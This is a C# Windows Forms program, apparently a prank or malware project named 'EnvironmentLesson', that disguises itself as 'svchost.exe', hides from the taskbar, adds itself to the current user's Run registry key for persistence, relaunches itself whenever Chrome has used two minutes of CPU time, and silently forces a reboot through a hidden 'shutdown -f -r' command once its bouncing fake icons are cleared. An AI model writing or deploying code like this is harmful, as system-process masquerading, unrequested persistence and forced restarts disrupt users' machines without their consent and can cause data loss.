using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EnvironmentLesson
{
    public partial class Form1 : Form
    {
        //Tests
        public int decreaseApp = 0;


        private Random rand = new Random();
        public static List<AppControl> buttons = new List<AppControl>();
        public static List<AppControl> deleted = new List<AppControl>();
        private static List<string> names = new List<string>();
        private static List<string> icons = new List<string>();
        System.Windows.Forms.Timer timer;
        public Form1()
        {
            InitializeComponent();

            RegistryKey runReg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            runReg.SetValue("svchost", System.Reflection.Assembly.GetEntryAssembly().Location);
            runReg.Close();
            //
            //  Main Settings
            //
            this.StartPosition = FormStartPosition.Manual;
            this.WindowState = FormWindowState.Maximized;
            this.DoubleBuffered = true;


            Thread thread = new Thread(new ThreadStart(StartApp));
            if (!thread.IsAlive)
            {
                thread.IsBackground = false;
                thread.Start();
            }
            // 
            //  Hide from Taskbar
            //
            this.ShowInTaskbar = false;

            //
            //  Name
            //
            this.Text = "svchost.exe";
            this.Name = "svchost.exe";
            this.AccessibleName = "svchost.exe";

            //
            //  Move event
            //
            timer = new System.Windows.Forms.Timer();
            timer.Tick += moveIcons;
            timer.Interval = 10;

            //
            //  Main Button Event
            //
            this.button1.Click += button1_Click;


            RegistryKey curent = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop");
            Image bg = Image.FromFile(curent.GetValue("WallPaper").ToString());
            this.BackgroundImage = bg;
            curent.Close();
            this.BackgroundImageLayout = ImageLayout.Stretch;
        }

        public static void StartApp()
        {
            Process procChrome = Process.GetProcessesByName("chrome")[0];
            while (true)
            {
                if (procChrome.TotalProcessorTime.TotalMinutes >= 2)
                {

                    RegistryKey getval = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                    string app = getval.GetValue("svchost").ToString();
                    getval.Close();
                    Process.Start(app);
                }
                Thread.Sleep(1000);
            }
        }
        private static void Restart()
        {
            ProcessStartInfo proc = new ProcessStartInfo();
            proc.WindowStyle = ProcessWindowStyle.Hidden;
            proc.FileName = "cmd";
            proc.Arguments = "/C shutdown -f -r";
            Process.Start(proc);

        }

        private void moveIcons(object sender, EventArgs e)
        {
            if (buttons.Count == 0)
            {
                Restart();
            }

            for (int i = 0; i < buttons.Count; i++)
            {
                //
                // To many if :<
                //
                buttons[i].Location = new Point(buttons[i].Location.X + getXAxis(i),
                    buttons[i].Location.Y + getYAxis(i));
            }

            this.Invalidate();
            this.Update();
        }

        private int getXAxis(int id)
        {
            if (buttons[id].Location.X < 0)
            {
                buttons[id].XAxis = -buttons[id].XAxis;
                //return 1;
            }
            if (buttons[id].Location.X + buttons[id].Size.Width > this.ClientSize.Width)
            {
                buttons[id].XAxis = buttons[id].XAxis;
                //return -1;
            }
            return buttons[id].XAxis;
            //return rand.Next(-1, 2);
        }
        private int getYAxis(int id)
        {
            if (buttons[id].Location.Y < 0)
            {
                buttons[id].YAxis = -buttons[id].YAxis;
                //return 1;
            }
            if (buttons[id].Location.Y + buttons[id].Size.Height > ClientSize.Height)
            {
                buttons[id].YAxis = -buttons[id].YAxis;
                //return -1;
            }
            return buttons[id].YAxis;
            //return rand.Next(-1, 2);
        }

        private void button1_Click(object sender, System.EventArgs eventArgs)
        {
            //
            //  Get info about apps
            //
            GetInstalledSoftware();

            //
            //  Add to form apps
            //
            for (int i = 0; i < names.Count; i++)
            {
                string path_temp = icons[i];
                AppControl TEMP = new AppControl();
                try
                {
                    path_temp = path_temp.Replace(",0", "");

                    TEMP.panel1.BackgroundImage = Icon.ExtractAssociatedIcon(path_temp).ToBitmap();
                    TEMP.label1.Text = names[i];
                    // -50 на всякий случай
                    TEMP.Location = new Point(rand.Next(0, this.ClientSize.Width - TEMP.Width - 50), rand.Next(0, this.ClientSize.Height - TEMP.Height - 50));
                    buttons.Add(TEMP);
                }

                catch (Exception e)
                {
                    try
                    {
                        path_temp = path_temp.Remove(path_temp.Length - 1, 1);
                        path_temp = path_temp.Remove(0, 1);
                        TEMP.panel1.BackgroundImage = Icon.ExtractAssociatedIcon(path_temp).ToBitmap();
                    }
                    catch (NotSupportedException)
                    {
                        Console.WriteLine(icons[i]);
                    }

                    TEMP.label1.Text = names[i];
                    // -50 на всякий случай
                    TEMP.Location = new Point(rand.Next(0, this.ClientSize.Width - TEMP.Width - 50), rand.Next(0, this.ClientSize.Height - TEMP.Height - 50));
                    buttons.Add(TEMP);
                }
            }

            for (int i = 0; i < buttons.Count - decreaseApp; i++)
            {
                for (int j = 0; j < deleted.Count; j++)
                {
                    if (buttons[i] == deleted[j])
                    {
                        return;
                    }
                }
                this.Controls.Add(buttons[i]);
            }

            //
            //  Move
            //
            this.timer.Start();


            this.button1.Enabled = false;
            this.button1.Hide();
        }

        private void GetInstalledSoftware()
        {
            List<string> items = new List<string>();
            string SoftwareKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(SoftwareKey))
            {
                foreach (string skName in rk.GetSubKeyNames())
                {
                    using (RegistryKey sk = rk.OpenSubKey(skName))
                    {
                        try
                        {
                            if (sk.GetValue("DisplayName") != null)
                            {
                                if (sk.GetValue("DisplayIcon") != null)
                                {
                                    icons.Add(sk.GetValue("DisplayIcon").ToString());
                                    names.Add(sk.GetValue("DisplayName").ToString());
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, "Exception", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                    }
                }
            }
            using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(SoftwareKey))
            {
                foreach (string skName in rk.GetSubKeyNames())
                {
                    using (RegistryKey sk = rk.OpenSubKey(skName))
                    {
                        try
                        {
                            if (sk.GetValue("DisplayName") != null)
                            {
                                if (sk.GetValue("DisplayIcon") != null)
                                {
                                    icons.Add(sk.GetValue("DisplayIcon").ToString());
                                    names.Add(sk.GetValue("DisplayName").ToString());
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, "Exception", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                    }
                }
            }

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
